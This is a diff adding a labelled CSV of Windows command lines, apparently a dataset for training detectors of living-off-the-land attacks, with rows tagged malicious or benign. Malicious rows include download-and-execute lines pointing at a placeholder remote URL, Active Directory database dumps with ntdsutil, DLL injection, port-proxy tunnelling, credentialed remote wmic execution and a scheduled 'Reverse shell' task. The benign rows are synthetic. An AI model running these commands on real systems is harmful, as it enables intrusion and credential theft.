@@ -1,0 +1,1589 @@
+command,label,source,command_id
+net.exe use Z: \\192.168.204.47\public,0,combined_lotl,1
+ATBroker.exe /start malware,1,combined_lotl,2
+"del ""C:\Users\usrs\Downloads\axycyg.dat"" /f /q",0,combined_lotl,3
+"type.exe ""C:\Users\fkaegxksi.dat""",0,combined_lotl,4
+#pragma delete_TRAP_DEST private localhost,0,combined_lotl,5
+"attrib.exe +h ""D:\Users\ceknij\Downloads\Downloads\sberatw.dll""",0,combined_lotl,6
+"dir ""D:\Logs\AppData"" /s /b",0,combined_lotl,7
+C:\Windows\System32\net.exe use Z: \\192.168.107.54\backup,0,combined_lotl,8
+"rmdir.exe ""C:\Users\fhbxott\Downloads\Pictures"" /s /q",0,combined_lotl,9
+"certutil.exe -hashfile ""C:\Windows\yirhuqlc.log"" SHA256",0,combined_lotl,10
+"icacls ""D:\Windows\AppData\nfbqahwg.ini"" /grant Everyone:F",0,combined_lotl,11
+echo Nc4xLzVzhqiH > D:\Users\Logs\mnicgm.exe,0,combined_lotl,12
+net.exe localgroup Administrators xciqzgop /add,0,combined_lotl,13
+wt.exe {CMD},1,combined_lotl,14
+echo.exe MpZvHvSqpBY7 > C:\Program Files\jduam.sys,0,combined_lotl,15
+ping.exe 192.168.174.117,0,combined_lotl,16
+"cdb.exe -pd -pn {process_name}
+.shell {CMD}
+",1,combined_lotl,17
+"move.exe ""D:\Logs\rocisog.dll"" ""D:\AppData\ykller.dll""",0,combined_lotl,18
+"powershell.exe -Command ""Get-ChildItem -Path C:\Windows\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,19
+bginfo.exe {PATH:.bgi} /popup /nolicprompt,1,combined_lotl,20
+"move ""D:\AppData\Program Files\zewdaalrz.txt"" ""C:\AppData\egjcxhwsoc.exe""",0,combined_lotl,21
+"copy ""D:\Users\yznql\Documents\akwptputl.txt"" ""C:\Users\xesgt\Pictures\zpjzfpkkd.exe""",0,combined_lotl,22
+ping 192.168.192.150,0,combined_lotl,23
+cmd.exe /Q /c *dir.exe 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1,1,volttyphoon,24
+"fsutil.exe file layout ""C:\Logs\AppData\bftacxx.sys""",0,combined_lotl,25
+"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr ""{cmd.exe}""",1,combined_lotl,26
+jsc.exe /t:library {PATH:.js},1,combined_lotl,27
+"move.exe ""D:\Users\phwqm\Desktop\cbyvk.log"" ""C:\AppData\akzcxfswf.dat""",0,combined_lotl,28
+Get-EventLog security -instanceid 4624,1,combined_lotl,29
+eventcreate.exe [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>,0,volttyphoon,30
+"del ""C:\AppData\Windows\uloysuj.txt"" /f /q",0,combined_lotl,31
+"type.exe ""C:\AppData\rntdi.txt""",0,combined_lotl,32
+extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},1,combined_lotl,33
+cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,1,combined_lotl,34
+net user fjhpurds /add,0,combined_lotl,35
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\Windows\nvefay.dll\"" \""D:\Logs\Logs\ferfufx.log\"""" /sc daily /st 23:00",0,combined_lotl,36
+ping.exe 192.168.46.131,0,combined_lotl,37
+net.exe use Z: \\192.168.128.68\data,0,combined_lotl,38
+PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},1,combined_lotl,39
+"C:\Windows\System32\attrib.exe +h ""D:\Users\xfjgok\Pictures\Pictures\lvylac.sys""",0,combined_lotl,40
+echo.exe G7dyNxjxy0aM > D:\Users\iwqi\Downloads\kellelehh.sys,0,combined_lotl,41
+Sqlps.exe -noprofile,1,combined_lotl,42
+detach vdisk [noerr],0,combined_lotl,43
+C:\Windows\System32\ping.exe 192.168.183.57,0,combined_lotl,44
+"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,45
+findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,1,combined_lotl,46
+"type.exe ""D:\Program Files\rhriafhupo.dat""",0,combined_lotl,47
+C:\Windows\fsutil.exe devdrv trust [/f] D:\Logs,0,combined_lotl,48
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Users\apqkljvej.ini\"" \""D:\Program Files\Temp\rahuwrs.exe\"""" /sc daily /st 23:00",0,combined_lotl,49
+wsl.exe -e /mnt/c/Windows/System32/calc.exe,1,combined_lotl,50
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Program Files\plpfkrhsk.dll\"" \""C:\AppData\Program Files\ikdptrrlq.sys\"""" /sc daily /st 23:00",0,combined_lotl,51
+copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,1,combined_lotl,52
+certutil.exe -hashfile data.log SHA256,0,combined_lotl,53
+C:\Windows\ping.exe 192.168.197.204,0,combined_lotl,54
+"del ""C:\Windows\Program Files\afunlhooc.log"" /f /q",0,combined_lotl,55
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\uhwc\Downloads\Documents\ppefoehmx.dll\"" \""D:\Logs\Logs\zpnbfzuwxn.log\"""" /sc daily /st 23:00",0,combined_lotl,56
+"dir.exe ""D:\AppData"" /s /b",0,combined_lotl,57
+"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
+C:\Windows\system32\pcwrun.exe
+C:\Users\Administrator\Desktop\Win.exe
+C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
+""cmd.exe"" /c dir \\127.0.0.1\C$ /od
+""cmd.exe"" /c ping –a –n 1 <IP address>
+""cmd.exe"" /c wmic /user:<username> /password:<password> process call create ""net stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
+net use \\127.0.0.1\IPC$ /y /d
+powershell start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
+rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
+wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami
+xcopy C:\windows\temp\hp d:\{REDACTED}",1,combined_lotl,58
+tar -xf {PATH}:ads,1,combined_lotl,59
+vstest.console.exe {PATH:.dll},1,combined_lotl,60
+"ssh -o ProxyCommand=""{C:\Windows\System32\cmd.exe}"" .",1,combined_lotl,61
+"C:\Windows\findstr.exe /C:""LPFLMh8rNP13"" ""D:\Windows\jotmazlb.log""",0,combined_lotl,62
+"copy ""C:\AppData\Program Files\jbufqx.sys"" ""D:\Windows\Temp\gdlwu.sys""",0,combined_lotl,63
+net.exe use Z: \\192.168.152.57\public,0,combined_lotl,64
+"certutil.exe -hashfile ""D:\Logs\kokgyppulc.sys"" SHA256",0,combined_lotl,65
+"copy ""D:\Windows\phrzbxrxwg.exe"" ""C:\Logs\Temp\dskcc.log""",0,combined_lotl,66
+"SyncAppvPublishingServer.vbs ""n;((New-Object net.exe.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1,combined_lotl,67
+"certutil.exe -hashfile ""C:\Windows\prhljpexkr.sys"" SHA256",0,combined_lotl,68
+C:\Windows\fsutil.exe devdrv clearFiltersAllowed [[/f] C:\AppData],0,combined_lotl,69
+procdump.exe -md {PATH:.dll} explorer.exe,1,combined_lotl,70
+Msconfig.exe -5,1,combined_lotl,71
+CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},1,combined_lotl,72
+"attrib +h ""D:\Logs\pnpfxqjnxl.txt""",0,combined_lotl,73
+"certutil -hashfile ""C:\Users\moqman\Pictures\yzctg.exe"" SHA256",0,combined_lotl,74
+net.exe localgroup Administrators mexwrfhj /add,0,combined_lotl,75
+Runonce.exe /AlternateShellStartup,1,combined_lotl,76
+"powershell -Command ""Get-ChildItem -Path D:\Users\mgpjcias\Desktop\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,77
+"echo %DATE% %TIME% >> ""C:\Users\jbrnzp\Documents\fvcber.dll""",0,combined_lotl,78
+echo HKJ1AZAUjlCs > D:\Temp\adcsmn.log,0,combined_lotl,79
+"rmdir ""D:\Users\mgqengrg\Desktop\Documents"" /s /q",0,combined_lotl,80
+"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",1,combined_lotl,81
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\fukjgg\Documents\szfhde.dll\"" \""C:\Logs\ispyddyos.log\"""" /sc daily /st 23:00",0,combined_lotl,82
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl},1,combined_lotl,83
+C:\Program Files\systeminfo.exe,0,combined_lotl,84
+"findstr.exe /C:""pDh41EuwAxSF"" ""C:\Program Files\Temp\lfnhd.ini""",0,combined_lotl,85
+diskshadow/set/writer verify [writer> | <component>],0,combined_lotl,86
+fsutil.exe devdrv query [C:\Logs],0,combined_lotl,87
+"copy ""D:\AppData\unuuwye.exe"" ""D:\Logs\pbxfzxe.ini""",0,combined_lotl,88
+"echo.exe %DATE% %TIME% >> ""D:\Windows\AppData\jhnvjt.sys""",0,combined_lotl,89
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\AppData\xuvlv.dll\"" \""C:\Logs\ouuruxhq.log\"""" /sc daily /st 23:00",0,combined_lotl,90
+"echo %DATE% %TIME% >> ""D:\Users\gdqrpgjsf.ini""",0,combined_lotl,91
+net.exe localgroup Administrators afmarhwe /add,0,combined_lotl,92
+net use Z: \\192.168.84.85\backup,0,combined_lotl,93
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Windows\adebirbe.sys\"" \""C:\Users\gwzwmibtxa.sys\"""" /sc daily /st 23:00",0,combined_lotl,94
+expand [-r] <source> <destination>,0,combined_lotl,95
+fc /b [E][C:\Logs]<filename1> [E][C:\Logs]<filename2>,0,combined_lotl,96
+"attrib +h ""D:\Windows\yxoyzvrvgs.exe""",0,combined_lotl,97
+esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,1,combined_lotl,98
+esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,1,combined_lotl,99
+ilasm.exe {PATH_ABSOLUTE:.txt} /dll,1,combined_lotl,100
+print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},1,combined_lotl,101
+"rmdir.exe ""D:\Users\kulz\Downloads\Downloads"" /s /q",0,combined_lotl,102
+"echo %DATE% %TIME% >> ""C:\Program Files\dhdvak.exe""",0,combined_lotl,103
+net.exe user vrjqdrvb /add,0,combined_lotl,104
+"mkdir.exe ""C:\Users\AppData""",0,combined_lotl,105
+"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",1,combined_lotl,106
+"C:\Windows\System32\findstr.exe /C:""fN6JaGjGFkae"" ""D:\Logs\ucgpmaxb.sys""",0,combined_lotl,107
+"echo %DATE% %TIME% >> ""D:\Users\bskaleea\Desktop\Desktop\hxsoq.ini""",0,combined_lotl,108
+"fsutil file layout ""D:\Users\jqxe\Pictures\Downloads\jscmkmvuis.ini""",0,combined_lotl,109
+net.exe localgroup Administrators ivlitoyx /add,0,combined_lotl,110
+CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},1,combined_lotl,111
+"move.exe ""D:\Logs\Users\mpvnprvdsg.log"" ""C:\Temp\Logs\afvxaazos.log""",0,combined_lotl,112
+"echo %DATE% %TIME% >> ""C:\AppData\Windows\xkunmnhi.dll""",0,combined_lotl,113
+echo.exe oC00O3JknI1N > D:\Users\ltuixkx\Downloads\Documents\mointo.log,0,combined_lotl,114
+Presentationhost.exe {PATH_ABSOLUTE:.xbap},1,combined_lotl,115
+coregen.exe dummy_assembly_name,1,combined_lotl,116
+"C:\Windows\icacls.exe ""D:\Users\Temp\qqwlgy.dll"" /grant Everyone:F",0,combined_lotl,117
+net.exe use Z: \\192.168.43.104\public,0,combined_lotl,118
+"rmdir.exe ""C:\Users\btjk\Downloads"" /s /q",0,combined_lotl,119
+"fsutil.exe file layout ""C:\Windows\mubwjx.dll""",0,combined_lotl,120
+rem  This batch program formats and checks new disks.,0,combined_lotl,121
+C:\Windows\System32\netsh.exe advfirewall show allprofiles,0,combined_lotl,122
+"Get-EventLog security -instanceid 4624 | Where-
+Object {$_.message.contains('{redacted user
+account}')} | select -First 1 | fl ",1,combined_lotl,123
+attrib.exe +r config.ini,0,combined_lotl,124
+"echo %DATE% %TIME% >> ""D:\Users\AppData\obiabrev.dll""",0,combined_lotl,125
+cmdkey /list,1,combined_lotl,126
+appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},1,combined_lotl,127
+"rmdir.exe ""D:\Users\zxgd\Documents"" /s /q",0,combined_lotl,128
+"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""",1,combined_lotl,129
+"copy ""C:\Temp\Temp\gizdkygigs.dat"" ""C:\Users\Logs\kfqegxx.exe""",0,combined_lotl,130
+net.exe localgroup Administrators jphxjhur /add,0,combined_lotl,131
+"rundll32.exe {PATH},EntryPoint",1,combined_lotl,132
+makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1,combined_lotl,133
+ping.exe 192.168.33.53,0,combined_lotl,134
+"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Windows\iovnftku.log""",0,combined_lotl,135
+ping.exe 192.168.207.233,0,combined_lotl,136
+"for /r ""C:\My C:\Windows\dir.exe\"" %A in (*.*) do echo %~ftzA",0,combined_lotl,137
+D:\Windows\type.exe {PATH_SMB} > {PATH_ABSOLUTE},1,combined_lotl,138
+rundll32.exe -sta {CLSID},1,combined_lotl,139
+Gpscript /logon,1,combined_lotl,140
+"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,141
+"copy ""D:\AppData\AppData\fhnixawvq.log"" ""D:\Users\hmdcwxro\Desktop\Pictures\asrqfrcbn.txt""",0,combined_lotl,142
+convert gpt [noerr],0,combined_lotl,143
+echo.exe 3v2PTVu9T8xi > C:\Program Files\zdakxbd.sys,0,combined_lotl,144
+OfflineScannerShell,1,combined_lotl,145
+"C:\Windows\powershell.exe -Command ""Get-Service""",0,combined_lotl,146
+"dissociate targets <n> [,<n> [,…]]",0,combined_lotl,147
+"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",1,combined_lotl,148
+"certutil.exe -hashfile ""D:\AppData\nscam.dll"" SHA256",0,combined_lotl,149
+"findstr /C:""EeB6tybC6SSA"" ""C:\Users\Temp\qxlju.log""",0,combined_lotl,150
+net user fvnywyoy /add,0,combined_lotl,151
+"del ""D:\Temp\wetvfwg.exe"" /f /q",0,combined_lotl,152
+"ntdsutil.exe snapshot “ac i ntds”
+create quit quit",1,volttyphoon,153
+net.exe user kxjgtkap /add,0,combined_lotl,154
+"Pester.bat [/help|?|-?|/?] ""$null; {cmd.exe}""",1,combined_lotl,155
+net.exe use Z: \\192.168.143.244\data,0,combined_lotl,156
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,1,combined_lotl,157
+"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",1,combined_lotl,158
+echo uE1BoJQV6Z1Q > C:\Windows\mgjjkmektv.log,0,combined_lotl,159
+"copy.exe ""C:\Logs\cievqlbb.sys"" ""D:\AppData\vowxlm.log""",0,combined_lotl,160
+net localgroup Administrators njgsiebq /add,0,combined_lotl,161
+echo.exe NbcwXf7ZwwV1 > D:\Program Files\Temp\voamrod.dll,0,combined_lotl,162
+"move ""C:\Program Files\fxokmohjd.exe"" ""D:\Users\zzvgg.dat""",0,combined_lotl,163
+"mkdir ""D:\Windows\Users""",0,combined_lotl,164
+"type.exe ""C:\AppData\Logs\lhoic.dll""",0,combined_lotl,165
+ieexec.exe {REMOTEURL:.exe},1,combined_lotl,166
+"del ""C:\Users\wetdkqfvb.txt"" /f /q",0,combined_lotl,167
+"C:\Windows\powershell.exe -Command ""Get-Process""",0,combined_lotl,168
+"findstr /C:""vFrvVNfliEpC"" ""D:\Windows\Users\waxbfrecn.dat""",0,combined_lotl,169
+"rmdir ""D:\Users\Windows"" /s /q",0,combined_lotl,170
+"rmdir.exe ""D:\Program Files\Temp"" /s /q",0,combined_lotl,171
+automount disable,0,combined_lotl,172
+Remote.exe /s {PATH_SMB:.exe} anythinghere,1,combined_lotl,173
+"findstr /C:""xbEY9lT0RhAI"" ""D:\Temp\agjya.ini""",0,combined_lotl,174
+"powershell.exe -Command ""Get-ChildItem -Path D:\Program Files\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,175
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\cskl\Documents\Documents\zzakqyk.exe\"" \""D:\Windows\AppData\njvthsn.log\"""" /sc daily /st 23:00",0,combined_lotl,176
+InstallUtil.exe {REMOTEURL},1,combined_lotl,177
+"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",1,combined_lotl,178
+net.exe use Z: \\192.168.210.227\backup,0,combined_lotl,179
+net.exe use Z: \\192.168.133.18\backup,0,combined_lotl,180
+MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},1,combined_lotl,181
+"copy.exe ""C:\Logs\gizstyww.sys"" ""D:\Temp\fnmcfs.log""",0,combined_lotl,182
+echo.exe NaJwizWIMPQs > C:\Windows\AppData\jmoao.dll,0,combined_lotl,183
+echo.exe IK2q1eRZ7W8u > D:\Users\qevnoloc\Downloads\Desktop\xcowgavw.sys,0,combined_lotl,184
+"dir ""D:\AppData""",0,combined_lotl,185
+flattemp {/query | /enable | /disable},0,combined_lotl,186
+"type.exe ""D:\Users\tuaoqc\Downloads\qejiuzdfpr.txt""",0,combined_lotl,187
+"copy ""D:\Temp\Temp\lqqjicju.exe"" ""C:\Users\AppData\nitychlyw.dat""",0,combined_lotl,188
+echo 7kj1wFvDwSwH > C:\AppData\raoadfb.dat,0,combined_lotl,189
+"cmd.exe"" /c wmic.exe process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\",1,volttyphoon,190
+"type.exe ""D:\Program Files\Temp\jnfqflcb.ini""",0,combined_lotl,191
+"certutil.exe -hashfile ""D:\Windows\iqpbvmfl.dat"" SHA256",0,combined_lotl,192
+"cmd.exe /c ""netsh.exe interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""",1,volttyphoon,193
+automagic {set | clear | apply} all <flag=value> [<flag=value> [...]],0,combined_lotl,194
+"echo %DATE% %TIME% >> ""C:\Program Files\Windows\vxfcecbtrg.sys""",0,combined_lotl,195
+"powershell -Command ""Get-ChildItem -Path C:\Users\fmkp\Downloads\Documents -Recurse | Select-Object FullName, Length""",0,combined_lotl,196
+"mkdir.exe ""D:\Program Files\Temp""",0,combined_lotl,197
+"Get-EventLog security -instanceid 4624 | Where-
+Object {$_.message.contains('{redacted user
+account}')} | select -First 1 | fl",1,volttyphoon,198
+"eventcreate /s server /u user /p password /id 100 /t ERROR /l application /d ""Remote machine with user credentials""",0,combined_lotl,199
+ping.exe 192.168.108.157,0,combined_lotl,200
+"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",1,combined_lotl,201
+"fsutil file layout ""C:\AppData\Program Files\dvokkystwx.sys""",0,combined_lotl,202
+C:\Windows\fsutil.exe volume querycluster C: 50 0x2000,0,combined_lotl,203
+wfc.exe {PATH_ABSOLUTE:.xoml},1,combined_lotl,204
+"del ""D:\Temp\cssaywwsko.sys"" /f /q",0,combined_lotl,205
+"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""D:\Program Files\xtfvtfmwmv.txt\"" \""C:\Users\taxpscq.ini\"""" /sc daily /st 23:00",0,combined_lotl,206
+net.exe use Z: \\192.168.156.140\backup,0,combined_lotl,207
+"certutil.exe -hashfile ""D:\Windows\Temp\ydyovtckbg.dll"" SHA256",0,combined_lotl,208
+"attrib.exe +h ""C:\Users\sjgmfurah.ini""",0,combined_lotl,209
+certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,1,combined_lotl,210
+echo TjoG4qkJ7f7E > C:\Logs\Logs\zlfcstbh.ini,0,combined_lotl,211
+ping 192.168.188.166,0,combined_lotl,212
+extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe,1,combined_lotl,213
+extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},1,combined_lotl,214
+sqldumper.exe 540 0 0x01100:40,1,combined_lotl,215
+ComputerDefaults.exe,1,combined_lotl,216
+"rmdir.exe ""D:\Users\tccnhfug\Documents\Desktop"" /s /q",0,combined_lotl,217
+"copy ""D:\Temp\kaaymu.txt"" ""C:\AppData\Windows\vgynpe.dat""",0,combined_lotl,218
+"C:\Windows\System32\copy.exe ""C:\Program Files\peuxjzwo.dat"" ""C:\Windows\Windows\ydohqi.txt""",0,combined_lotl,219
+"echo %DATE% %TIME% >> ""D:\Users\AppData\uojnpjtv.exe""",0,combined_lotl,220
+ping.exe 192.168.116.250,0,combined_lotl,221
+"copy ""D:\Temp\Program Files\rlhxr.dat"" ""D:\Windows\Program Files\asgjzbe.dat""",0,combined_lotl,222
+C:\Windows\echo.exe J269K4ZAYdBj > D:\Program Files\AppData\pwwvndtcc.dll,0,combined_lotl,223
+regini.exe {PATH}:hidden.ini,1,combined_lotl,224
+"cdb.exe -c {PATH:.txt} ""{CMD}""",1,combined_lotl,225
+OpenConsole.exe {PATH:.exe},1,combined_lotl,226
+"D:\Windows\certutil.exe -hashfile ""C:\Users\Logs\tillrj.ini"" SHA256",0,combined_lotl,227
+"certutil -hashfile ""C:\Users\Program Files\dmqpqxup.log"" SHA256",0,combined_lotl,228
+Extexport.exe {PATH_ABSOLUTE:folder} foo bar,1,combined_lotl,229
+"findstr.exe /C:""roDjjy8dglLB"" ""C:\Program Files\AppData\kprohlbm.log""",0,combined_lotl,230
+echo.exe nkjhsAAYD6xa > C:\AppData\jopmfmsoqd.dat,0,combined_lotl,231
+ping.exe 192.168.85.250,0,combined_lotl,232
+"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
+C:\Windows\system32\pcwrun.exe
+C:\Users\Administrator\Desktop\Win.exe
+C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
+""cmd.exe"" /c dir.exe \\127.0.0.1\C$ /od
+""cmd.exe"" /c ping –a –n 1 <IP address>
+""cmd.exe"" /c wmic.exe /user:<username> /password:<password> process call create ""net.exe stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
+net.exe use \\127.0.0.1\IPC$ /y /d
+powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
+rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
+wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd.exe /c whoami.exe
+xcopy.exe C:\windows\temp\hp d:\{REDACTED}",1,volttyphoon,233
+AppVLP.exe {PATH_SMB:.bat},1,combined_lotl,234
+"E:\Windows\System32\attrib.exe +h ""D:\Program Files\Temp\cqyrpdp.dll""",0,combined_lotl,235
+"copy ""D:\Program Files\Windows\hfjba.dll"" ""C:\Users\iqzojex.log""",0,combined_lotl,236
+add volume <volume> [provider dbe96af8-5b14-450b-9d3b-fdfb1b5730dd],0,combined_lotl,237
+"copy.exe ""D:\Users\ukvqz\Pictures\bygkt.ini"" ""C:\Windows\ycojdsuk.log""",0,combined_lotl,238
+"type ""C:\Users\floaoihr\Downloads\Documents\mryzug.ini""",0,combined_lotl,239
+"C:\Windows\System32\type.exe ""D:\Program Files\mgnwuuw.dll""",0,combined_lotl,240
+"move ""C:\Users\mgvfv\Documents\xlzxvoxi.txt"" ""D:\Users\Windows\njvkh.exe""",0,combined_lotl,241
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\kkhujmcijp.ini\"" \""C:\Temp\AppData\dvbzi.dat\"""" /sc daily /st 23:00",0,combined_lotl,242
+net.exe user toysmrja /add,0,combined_lotl,243
+add tpgroup tportal=n [noerr],0,combined_lotl,244
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\sghgxr.sys\"" \""C:\Logs\fesjcw.dll\"""" /sc daily /st 23:00",0,combined_lotl,245
+vbc.exe /target:exe {PATH_ABSOLUTE:.vb},1,combined_lotl,246
+"del ""D:\AppData\ebxxwrk.log"" /f /q",0,combined_lotl,247
+"icacls ""C:\Windows\Program Files\dawaoszbc.log"" /grant Everyone:F",0,combined_lotl,248
+"D:\Windows\System32\findstr.exe /C:""slDdm10dyAn8"" ""C:\Users\ybwyy\Downloads\Documents\tahupowjs.sys""",0,combined_lotl,249
+HH.exe {REMOTEURL:.bat},1,combined_lotl,250
+echo sOC0hNsctJvG > D:\Windows\jhdrpmyql.sys,0,combined_lotl,251
+"mkdir.exe ""D:\Users\dgzwibp\Desktop\Pictures""",0,combined_lotl,252
+"type ""C:\Users\lzezy\Pictures\adlmciiea.ini""",0,combined_lotl,253
+\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,1,combined_lotl,254
+"type ""D:\Program Files\hbscp.log""",0,combined_lotl,255
+print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},1,combined_lotl,256
+"rundll32 ieadvpack.dll, RegisterOCX {cmd.exe}",1,combined_lotl,257
+"sftp -o ProxyCommand=""{C:\Windows\System32\cmd.exe}"" .",1,combined_lotl,258
+pktmon.exe filter add -p 445,1,combined_lotl,259
+"type ""C:\Users\efjpz.exe""",0,combined_lotl,260
+"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Program Files\Logs\khqujaapl.log\"" \""C:\Windows\Program Files\hmjmvt.dll\"""" /sc daily /st 23:00",0,combined_lotl,261
+"D:\Windows\icacls.exe ""C:\Windows\bueor.txt"" /grant Everyone:F",0,combined_lotl,262
+C:\Windows\System32\net.exe use Z: \\192.168.218.178\data,0,combined_lotl,263
+csc.exe -out:{PATH:.exe} {PATH:.cs},1,combined_lotl,264
+echo 7vF7asC1ZkYH > C:\Logs\Temp\aemrsry.exe,0,combined_lotl,265
+msiexec /y {PATH_ABSOLUTE:.dll},1,combined_lotl,266
+teams.exe,1,combined_lotl,267
+"move ""C:\Temp\grgiqcyh.log"" ""D:\Users\snbngwamp.exe""",0,combined_lotl,268
+"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1,combined_lotl,269
+"type.exe ""D:\Program Files\AppData\ymfbhycq.dll""",0,combined_lotl,270
+"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",1,combined_lotl,271
+regsvr32.exe /s {PATH:.dll},1,combined_lotl,272
+Pcwrun.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,273
+"del ""C:\Program Files\Windows\nuuxdwg.log"" /f /q",0,combined_lotl,274
+ping.exe 192.168.94.185,0,combined_lotl,275
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\xidnpbnr\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,276
+"attrib +h ""C:\Windows\duuawtz.dll""",0,combined_lotl,277
+cmd.exe - < {PATH}:payload.bat,1,combined_lotl,278
+"del ""D:\Users\peisjj\Desktop\rkywmpmy.dat"" /f /q",0,combined_lotl,279
+"ntdsutil snapshot “ac i ntds”
+create quit quit",1,combined_lotl,280
+squirrel.exe --updateRollback={REMOTEURL},1,combined_lotl,281
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\AppData\klbnk.txt\"" \""C:\Logs\eitxaaxds.ini\"""" /sc daily /st 23:00",0,combined_lotl,282
+"dir.exe ""D:\Users\euitqk\Documents\Downloads"" /s /b",0,combined_lotl,283
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\AppData\mfung.dat\"" \""D:\AppData\Logs\vbcrygy.txt\"""" /sc daily /st 23:00",0,combined_lotl,284
+"dir ""C:\Logs\Temp"" /s /b",0,combined_lotl,285
